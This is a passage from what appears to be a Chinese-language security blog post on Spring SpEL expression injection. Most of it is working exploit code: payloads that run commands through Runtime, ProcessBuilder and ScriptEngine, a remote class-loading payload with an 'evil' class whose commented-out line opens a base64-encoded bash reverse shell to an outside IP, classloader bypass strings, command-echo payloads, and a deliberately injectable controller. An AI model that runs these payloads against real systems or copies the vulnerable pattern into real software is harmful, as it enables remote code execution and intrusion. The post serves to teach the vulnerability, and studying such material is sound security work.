java.lang.ProcessBuilder(new String[]&#123;\"calc\"&#125;).start()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719150401829.png" alt="image-20240719150401829"></p><hr><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")"</span><span class="token punctuation">;</span><span class="token comment">// engine也可以用javascript</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这里不是<code>T()</code>，因为 <code>getEngineByName</code> 不是 static 方法，不过可以直接new</p><hr><h2 id="RCE-ver2——远程类加载"><a href="#RCE-ver2——远程类加载" class="headerlink" title="RCE ver2——远程类加载"></a>RCE ver2——远程类加载</h2><h3 id="UrlClassloader"><a href="#UrlClassloader" class="headerlink" title="UrlClassloader"></a>UrlClassloader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL('http://127.0.0.1:8888/')&#125;).loadClass(\"evil\").newInstance()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地恶意类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> evil <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//Runtime.getRuntime().exec("bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;");</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="AppClassloader"><a href="#AppClassloader" class="headerlink" title="AppClassloader"></a>AppClassloader</h3><p>获取ClassLoader去加载本地的类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><p>获取classloader关键字：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span>Expression</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#thymeleaf 情况下<span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>thymeleaf<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span>AbstractEngineContext</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#web服务下通过内置对象<span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>\"<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>\"getRuntime\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>\"touch<span class="token operator">/</span>tmp<span class="token operator">/</span>foobar\"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>username<span class="token punctuation">[</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"js"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec('xterm')"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>asdf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="RCE-ver3——回显"><a href="#RCE-ver3——回显" class="headerlink" title="RCE ver3——回显"></a>RCE ver3——回显</h2><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span></span><span class="token class-name">SpelParserConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实这并不是纯粹的回显，因为你需要return这个返回结果，而真实情况一般是不会return这个结果的</p><hr><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"dir"</span><span class="token punctuation">,</span> <span class="token string">".\\"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GBK"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"asdasdasdasd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的<code>Delimiter</code>是分隔符的意思，我们执行了dir指令，假如想让回显全部显示在一行。那么我们给一点乱七八糟的东西即可</p><hr><h3 id="ResponseHeader"><a href="#ResponseHeader" class="headerlink" title="ResponseHeader"></a>ResponseHeader</h3><p>通用回显</p><p>这种方法需要有一个方法可以<code>addHeader</code>，可是springboot并不自带这个方法。因此获取到Response有些许困难，需要注册一个response进上下文</p><p>代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation 